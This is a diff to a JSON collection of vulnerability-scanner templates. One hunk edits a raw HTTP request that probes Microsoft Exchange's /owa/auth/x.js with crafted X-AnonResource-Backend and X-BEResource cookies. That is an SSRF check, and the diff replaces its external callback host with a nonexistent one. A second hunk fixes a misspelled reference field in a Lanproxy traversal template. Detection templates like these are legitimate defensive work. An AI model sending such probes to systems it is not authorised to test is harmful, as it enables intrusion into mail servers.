@@ -8177,21 +8177,22 @@
           "matchers": [
             {
               "status": [
-                200
+                500,
+                503
               ],
               "type": "status"
             },
             {
-              "part": "body",
+              "part": "header",
               "type": "word",
               "words": [
-                "Burp Collaborator Server"
+                "X-Calculatedbetarget: somethingnonexistent"
               ]
             }
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /owa/auth/x.js HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nCookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;\nAccept-Language: en\nConnection: close\n"
+            "GET /owa/auth/x.js HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nCookie: X-AnonResource=true; X-AnonResource-Backend=somethingnonexistent/ecp/default.flt?~3; X-BEResource=somethingnonexistent/owa/auth/logon.aspx?~3;\nAccept-Language: en\nConnection: close\n"
           ]
         }
       ]
@@ -8281,7 +8282,7 @@
       "info": {
         "author": "pikpikcu",
         "name": "Lanproxy Directory Traversal",
-        "refrence": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3019",
+        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3019",
         "severity": "medium",
         "tags": "cve,cve2021,lanproxy,traversal"
       },
